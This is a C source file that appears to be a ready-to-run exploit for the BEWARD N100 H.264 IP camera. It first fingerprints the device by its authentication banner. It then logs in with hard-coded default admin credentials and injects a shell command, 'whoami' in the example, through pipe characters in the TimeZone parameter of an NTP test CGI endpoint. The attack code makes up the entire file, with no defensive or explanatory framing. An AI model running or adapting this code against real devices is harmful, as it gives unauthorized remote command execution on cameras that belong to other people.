// "BEWARD N100 H.264 VGA

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

#define MAX_RESPONSE_SIZE 8192

char *execute(const char *target_ip, int port, const char *cmd) {
    int sock;
    struct sockaddr_in server_addr;
    char request[1024];
    char response[MAX_RESPONSE_SIZE];
    int bytes_received;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        return NULL;
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    inet_pton(AF_INET, target_ip, &server_addr.sin_addr);

    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Connection failed");
        close(sock);
        return NULL;
    }

    snprintf(request, sizeof(request),
             "GET /cgi-bin/operator/servetest?cmd=ntp&ServerName=pool.ntp.org&TimeZone=03:00|%s|| HTTP/1.1\r\n"
             "Host: %s\r\n"
             "Authorization: Basic YWRtaW46YWRtaW4=\r\n"
             "Connection: close\r\n\r\n",
             cmd, target_ip);

    send(sock, request, strlen(request), 0);

    memset(response, 0, sizeof(response));
    bytes_received = recv(sock, response, sizeof(response) - 1, 0);
    close(sock);

    if (bytes_received < 0) {
        perror("Receive failed");
        return NULL;
    }

    response[bytes_received] = '\0';
    char *output = strdup(response); // Duplicate response to return
    return output;
}

int check(const char *target_ip, int port) {
    int sock;
    struct sockaddr_in server_addr;
    char request[256];
    char response[MAX_RESPONSE_SIZE];
    int bytes_received;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        return 0;
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    inet_pton(AF_INET, target_ip, &server_addr.sin_addr);

    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Connection failed");
        close(sock);
        return 0;
    }

    snprintf(request, sizeof(request),
             "GET / HTTP/1.1\r\n"
             "Host: %s\r\n"
             "Connection: close\r\n\r\n",
             target_ip);

    send(sock, request, strlen(request), 0);

    memset(response, 0, sizeof(response));
    bytes_received = recv(sock, response, sizeof(response) - 1, 0);
    close(sock);

    if (bytes_received < 0) {
        perror("Receive failed");
        return 0;
    }

    response[bytes_received] = '\0';
    if (strstr(response, "WWW-Authenticate: Basic realm=\"N100 H.264 IP Camera\"")) {
        return 1; // Vulnerable
    }
    return 0; // Not vulnerable
}

int main(int argc, char *argv[]) {
    if (argc < 3) {
        printf("Usage: %s <target_ip> <port>\n", argv[0]);
        return 1;
    }

    const char *target_ip = argv[1];
    int port = atoi(argv[2]);

    if (check(target_ip, port)) {
        printf("Target %s:%d is vulnerable\n", target_ip, port);
        printf("Executing command...\n");
        char *response = execute(target_ip, port, "whoami"); // Example command
        if (response) {
            printf("Response: %s\n", response);
            free(response);
        }
    } else {
        printf("Exploit failed - target %s:%d seems to be not vulnerable\n", target_ip, port);
    }

    return 0;
}
